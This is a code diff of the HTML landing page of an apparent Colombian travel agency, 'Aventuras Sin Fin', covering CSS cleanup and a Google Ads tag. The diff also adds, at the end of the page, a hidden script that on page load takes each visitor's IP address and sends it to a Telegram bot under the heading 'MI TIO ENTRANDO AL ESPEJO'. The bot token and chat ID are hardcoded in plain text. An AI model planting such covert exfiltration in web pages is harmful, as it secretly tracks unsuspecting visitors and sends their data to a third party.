@@ -6,49 +6,24 @@
   <title>Aventuras Sin Fin - Agencia de Viajes Colombia</title>
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-  
-    <script src="https://crypto-js.googlecode.com/svn/tags/3.1.9-1/build/rollups/aes.js"></script>
-    <script>
-  // Clave secreta para la encriptación (elige una clave secreta y mantenla segura)
-  const secretKey = 'miClaveSecreta123';
 
-  // Valores a encriptar (token de Telegram y chatId)
-  const token = '7978973213:AAGZ5tkPk98atTrFAYHtoI2Mb-wqIlQPTWM';
-  const chatId = '-4695874904';
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17201065252"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'AW-17201065252');
+  </script>
 
-  // Encriptar el token y el chatId usando AES
-  const encryptedToken = CryptoJS.AES.encrypt(token, secretKey).toString();
-  const encryptedChatId = CryptoJS.AES.encrypt(chatId, secretKey).toString();
-
-  console.log('Encrypted Token:', encryptedToken);
-  console.log('Encrypted Chat ID:', encryptedChatId);
-</script>
-
-
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17201065252">
-</script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'AW-17201065252');
-</script>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
       font-family: 'Montserrat', sans-serif;
       line-height: 1.6;
       color: #333;
       background-color: #f9f9f9;
     }
-
     header {
       background: url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e') no-repeat center center/cover;
       height: 100vh;
@@ -60,22 +35,19 @@
       text-align: center;
       padding: 0 20px;
     }
-
     header h1 {
       font-size: 3rem;
       margin-bottom: 10px;
       animation: fadeIn 1.5s ease-in-out;
     }
-
     header p {
       font-size: 1.2rem;
       margin-bottom: 30px;
       animation: fadeIn 2s ease-in-out;
     }
-
     .boton-viaje {
       display: inline-block;
-      background-color: #5B2C6F; /* morado LATAM */
+      background-color: #5B2C6F;
       color: white;
       padding: 15px 30px;
       font-size: 1.1rem;
@@ -87,14 +59,12 @@
       transition: background-color 0.3s ease, transform 0.2s ease;
       animation: fadeIn 2.5s ease-in-out;
     }
-
     .boton-viaje:hover {
-      background-color: #7D3C98; /* morado más claro al hover */
+      background-color: #7D3C98;
       transform: scale(1.05);
     }
-
     nav {
-      background-color: #5B2C6F; /* morado LATAM */
+      background-color: #5B2C6F;
       display: flex;
       justify-content: center;
       flex-wrap: wrap;
@@ -103,7 +73,6 @@
       top: 0;
       z-index: 1000;
     }
-
     nav a {
       color: white;
       text-decoration: none;
@@ -111,24 +80,18 @@
       font-weight: bold;
       transition: color 0.3s;
     }
-
-    nav a:hover {
-      color: #D2B4DE; /* morado claro */
-    }
-
+    nav a:hover { color: #D2B4DE; }
     section {
       padding: 60px 20px;
       max-width: 1100px;
       margin: auto;
     }
-
     section h2 {
       text-align: center;
       font-size: 2rem;
       margin-bottom: 30px;
       color: #5B2C6F;
     }
-
     .destinos ul {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
@@ -136,7 +99,6 @@
       list-style: none;
       padding: 0;
     }
-
     .destinos li {
       background-color: white;
       padding: 20px;
@@ -147,11 +109,9 @@
       color: #5B2C6F;
       font-weight: 600;
     }
-
     .destinos li:hover {
       transform: translateY(-5px);
     }
-
     .servicios, .testimonios, .contacto {
       background-color: #fff;
       border-radius: 10px;
@@ -159,7 +119,6 @@
       box-shadow: 0 2px 10px rgba(0,0,0,0.05);
       color: #4a235a;
     }
-
     blockquote {
       font-style: italic;
       margin: 20px auto;
@@ -167,57 +126,27 @@
       max-width: 700px;
       color: #555;
     }
-
     footer {
       background-color: #4a235a;
       color: white;
       text-align: center;
       padding: 20px 10px;
     }
-
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
-
     @media (max-width: 768px) {
-      header h1 {
-        font-size: 2.2rem;
-      }
-
-      header p {
-        font-size: 1rem;
-      }
-
-      .boton-viaje {
-        font-size: 1rem;
-        padding: 12px 24px;
-      }
-
-      nav a {
-        margin: 5px 10px;
-        font-size: 0.95rem;
-      }
+      header h1 { font-size: 2.2rem; }
+      header p { font-size: 1rem; }
+      .boton-viaje { font-size: 1rem; padding: 12px 24px; }
+      nav a { margin: 5px 10px; font-size: 0.95rem; }
     }
-
     @media (max-width: 480px) {
-      header {
-        padding: 0 10px;
-      }
-
-      header h1 {
-        font-size: 1.8rem;
-      }
-
-      header p {
-        font-size: 0.95rem;
-      }
-
-      .boton-viaje {
-        width: 100%;
-        padding: 14px;
-        font-size: 1rem;
-      }
+      header { padding: 0 10px; }
+      header h1 { font-size: 1.8rem; }
+      header p { font-size: 0.95rem; }
+      .boton-viaje { width: 100%; padding: 14px; font-size: 1rem; }
     }
   </style>
 </head>
@@ -275,6 +204,36 @@
   <footer>
     <p>&copy; 2025 Aventuras Sin Fin | Agencia de Viajes Colombia</p>
   </footer>
+
+  <!-- Script para enviar IP a Telegram -->
+  <script>
+    const token = '7978973213:AAGZ5tkPk98atTrFAYHtoI2Mb-wqIlQPTWM'; // Tu token de bot
+    const chatId = '-4695874904'; // Tu chat ID
+
+    async function getUserIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch (error) {
+        return 'IP no disponible';
+      }
+    }
+
+    async function notifySiteVisit() {
+      const ip = await getUserIP();
+      const message = `📣💊 *MI TIO ENTRANDO AL ESPEJO* 💊📣\n🌍 *IP:* ${ip}`;
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+
+      try {
+        await fetch(url);
+      } catch (error) {
+        console.error('Error al enviar el mensaje de ingreso:', error);
+      }
+    }
+
+    window.onload = notifySiteVisit;
+  </script>
 
 </body>
 </html>
